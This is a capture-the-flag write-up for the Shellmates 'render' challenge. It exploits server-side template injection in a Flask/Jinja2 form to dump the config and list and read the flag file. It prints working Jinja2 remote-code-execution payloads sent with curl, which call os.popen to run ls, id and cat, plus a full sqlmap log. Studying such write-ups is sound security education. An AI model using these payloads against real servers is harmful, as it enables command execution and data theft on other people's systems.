# render

## Description

> Could do you render the flag for me?

## Hint 

This is a flask web application with jinja2, search for known vulnerabilities about it.
## Write-Up

When first accessing the website, we can see that it contains a simple form with an action to the root route `/` and with a simple input with `name` name.

```html
<!DOCTYPE html>
<html>
<head>
        <title>
                Mentoring program
        </title>
</head>
<style>
   @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
        *{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Roboto Mono', monospace;
        }
        body{
                background-color: black;
                width: 100%;
                padding-top: 160px;
                display: flex;
                flex-direction: column;
                justify-content:center;
                align-items: center;

        }
        .form{
                width: 100%;
                display: inline-block;
                height: 50px;
                max-width: 400px;
                position: relative;
                overflow: hidden;
        }
...
        @media only screen and (min-width:320px) and (max-width:768px){
         .form{
                width:85%;
        }
                }
</style>
<body style="text-align:center;" id="body">
        <form class="form" action="/" method="POST">
                <input type="text" id="name" name="name" required>
                <label class="lbl">
                        <span class="text-nom">Enter your name</span>
                </label>
        <br>
        <br>

        </form>
    <br>
        <br>
        <br>
        <br>
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
        </p>
</body>

</html>
```

Try to do some SQL injections or Command injections, but nothing worked.

When checking the hint : since it is a flask server with jinja2, and after some research and checks, we can see the website might be vulnerable to **Sever-Side Template Injection** or **SSTI**. Let's check that out and inject some template directives :

**Note :** **Sever-Side Template Injection** or **SSTI** is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{7*7}}"
```

```html
<!DOCTYPE html>
<html>
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : 49
        </p>
</body>

</html>
```

Indeed, this website is vulnerable to **SSTI** vulnerability. So to get the flag, let's try to exploit it a bit.

First, let's try to see what items is this server hiding :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{ config.items() }}"
```

```html
<!DOCTYPE html>
<html>
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
      Welcome Mentee : dict_items([(&amp;#39;ENV&amp;#39;, &amp;#39;production&amp;#39;), (&amp;#39;DEBUG&amp;#39;, False), (&amp;#39;TESTING&amp;#39;, False), (&amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;, None),
      ...
      (&amp;#39;WNOHANG&amp;#39;, 1), (&amp;#39;WNOWAIT&amp;#39;, 16777216), (&amp;#39;WSTOPPED&amp;#39;, 2), (&amp;#39;WSTOPSIG&amp;#39;, &amp;lt;built-in function WSTOPSIG&amp;gt;), (&amp;#39;WTERMSIG&amp;#39;, &amp;lt;built-in function WTERMSIG&amp;gt;), (&amp;#39;WUNTRACED&amp;#39;, 2), (&amp;#39;W_OK&amp;#39;, 2), (&amp;#39;X_OK&amp;#39;, 1)])

        </p>
</body>

</html>
```

> Our second interesting discovery comes from introspecting the config object. The config object is a Flask template global that represents “The current configuration object (flask.config).” It is a dictionary-like object that contains all of the configuration values for the application. In most cases, this includes sensitive values such as database connection strings, credentials to third party services, the SECRET_KEY, etc. Viewing these configuration items is as easy as injecting a payload of {{ config.items() }}.


See current local variables :
```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{locals()}}"   
```

After finding nothing in the global config as well as local variables, let's try other exploits.

Mainly when we find an **SSTI**, we always lookup to get command execution. This can be realized with the `os` package. IT can be either imported, or can be exploited by another package like `sys` ...

1. So the first solution is to try and see available packages and check for a module that uses 'os'. We can check for packages like following :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{'foo'.__class__.__base__.__subclasses__()}}"
```

```html
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
Welcome Mentee : [&amp;lt;class &amp;#39;type&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;async_generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray&amp;#39;&amp;gt
...
&amp;lt;class &amp;#39;contextlib.ContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib.AsyncContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._GeneratorContextManagerBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._BaseExitStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Final&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Immutable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._NotIterable&amp;#39;&amp;gt;, typing.Any, &amp;lt;class &amp;#39;typing._PickleUsingNameMixin&amp;#39;&amp;gt;,
...
urceManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkg_resources.NullProvider&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkg_resources.NoDists&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkg_resources.EntryPoint&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkg_resources.Distribution&amp;#39;&amp;gt;]
        </p>
</body>

</html> 
```

We can find that `'warnings.catch_warnings'` class is among the classes :

```
<class 'warnings.catch_warnings'>
```

This classe imports Python `sys` module , and from `sys` we can reach out to `os` module.

After some digging, we found that this class is located in index **`#207`**, see `check_classes.py` for how to extract index, or use the following command :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data 'name={{[cls.__name__ for cls in "foo".__class__.__base__.__subclasses__()].index("catch_warnings")}}'
```

Now, here is how we can exploit is to, for example list directory of where the `app.py` is located (Note the use of the class index in previous command to generate the exploit).

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data 'name={{"foo".__class__.__base__.__subclasses__()[207].__init__.__globals__["sys"].modules["os"].popen("ls").read()}}'
```

```html
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : app.py
requirements.txt
static
templates
this_IS_TH3_FLL4AAAG

        </p>
</body>

</html> 
```

From here, we can execute a simple `cat` command to read the `this_IS_TH3_FLL4AAAG` file :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data 'name={{"foo".__class__.__base__.__subclasses__()[207].__init__.__globals__["sys"].modules["os"].popen("cat this_IS_TH3_FLL4AAAG").read()}}'
```

```html
        <br>
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : shellmates{SSTI_X_J1NJA_893274}

        </p>
</body>

</html>
```

2. Another solution is to use a context-free payload, and do not require anything, except being in a jinja2 Template object. We can do that by exploiting the `cycler` module, this module is used by `flask`, so it is always there, and do imports `os` module so we can exploit is to get some Command Execution (Got it from here [Payloads All Things - SSTI - Jinja2 - Remote Execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution), you can check the command or other commands as well): 

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
```

```html
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : uid=65534(nobody) gid=65534(nobody)

        </p>
</body>

</html>   
```

we can list directory of where the `app.py` is located :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}"
```

```html
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : app.py
requirements.txt
static
templates
this_IS_TH3_FLL4AAAG

        </p>
</body>

</html>  
```

And just cat the flag file :

```
curl 'http://render.web-server.challs.ctf.shellmates.club/' -X POST --data "name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat this_IS_TH3_FLL4AAAG').read() }}"
```

```html
...
        <br>
        <p id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-size: 45px;
                                                        font-weight: bold;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        Welcome Mentee : shellmates{SSTI_X_J1NJA_893274}

        </p>
</body>

</html> 
```

## Flag

shellmates{SSTI_X_J1NJA_893274}

## More Information

 - What is SSTI : https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 - First solution article : https://secure-cookie.io/attacks/ssti/
 - Payloads for All Things (Needed for second solution) : https://github.com/swisskyrepo/PayloadsAllTheThings
 - SSTI Examples And further explanations : 
   - https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
   - https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
   - https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
 - Coding a Vulnerable App and exploit is : https://payatu.com/blog/debjeet/understanding-ssti

**Note :** We can try to execute it using sqlmap, but in this challenge, number of attempts is limited so it won't work. But here is the command anyway :

```
sqlmap -u "http://render.web-server.challs.ctf.shellmates.club/" --data="name=Walid" --method POST --dbs
```

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.10#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[02:07:07] [INFO] testing connection to the target URL
[02:07:07] [INFO] testing if the target URL content is stable
[02:07:08] [INFO] target URL content is stable
[02:07:08] [INFO] testing if POST parameter 'name' is dynamic
[02:07:08] [WARNING] POST parameter 'name' does not appear to be dynamic
[02:07:08] [WARNING] heuristic (basic) test shows that POST parameter 'name' might not be injectable
[02:07:08] [INFO] testing for SQL injection on POST parameter 'name'
[02:07:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:07:09] [WARNING] reflective value(s) found and filtering out
[02:07:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:07:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:07:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:07:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:07:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[02:07:14] [INFO] testing 'Generic inline queries'
[02:07:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:07:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[02:07:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[02:07:15] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[02:07:15] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
[02:07:15] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[02:07:15] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[02:07:15] [CRITICAL] connection reset to the target URL
[02:07:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] y
[02:07:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[02:07:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[02:07:27] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[02:07:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[02:07:38] [WARNING] POST parameter 'name' does not seem to be injectable
[02:07:38] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 02:07:38 /2022-12-26/


```